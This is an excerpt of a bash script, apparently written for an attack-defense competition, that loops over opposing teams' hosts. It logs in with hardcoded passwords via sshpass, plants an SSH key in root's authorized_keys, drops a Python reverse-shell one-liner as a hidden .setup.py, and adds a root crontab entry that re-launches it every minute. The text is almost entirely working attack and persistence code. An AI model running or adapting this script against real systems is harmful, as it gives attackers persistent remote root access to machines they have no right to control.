...
do
	...
	if [[ $i != $teamnum ]]; then
		...
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.37.134\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		sshpass -p "password" ssh -o StrictHostKeyChecking=no aflickem@192.168.37.135 'mkdir -p ~/.ssh'
		sshpass -p "password" ssh -o StrictHostKeyChecking=no aflickem@192.168.37.135 'echo "ssh-rsa " >> ~/.ssh/authorized_keys'
 		sshpass -p "password" scp here aflickem@192.168.37.135:/home/aflickem/.setup.py
 		sshpass -p "password" ssh -o StrictHostKeyChecking=no aflickem@192.168.37.135 'echo "* * * * * root /bin/bash /home/aflickem/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo $x
		...
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.10 'echo "ssh-rsa " >> ~/.ssh/authorized_keys'
 		...
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.10 'echo "* * * * * root /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo $x
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		...
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.50 'echo "ssh-rsa " >> ~/.ssh/authorized_keys'
 		...
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.50 'echo "* * * * * root /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo $x
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		...
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.60 'echo "ssh-rsa " >> ~/.ssh/authorized_keys'
 		...
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.2.$i.60 'echo "* * * * * root /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo $x
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.$i.50\",$x));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > here
		...
		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.3.$i.10 'echo "ssh-rsa " >> ~/.ssh/authorized_keys'
 		...
 		sshpass -p "$password" ssh -o StrictHostKeyChecking=no root@10.3.$i.10 'echo "* * * * * root /bin/bash /usr/local/bin/.setup.py" >> /etc/crontab'
		x=$((x+1))
		echo $x
 	fi
done
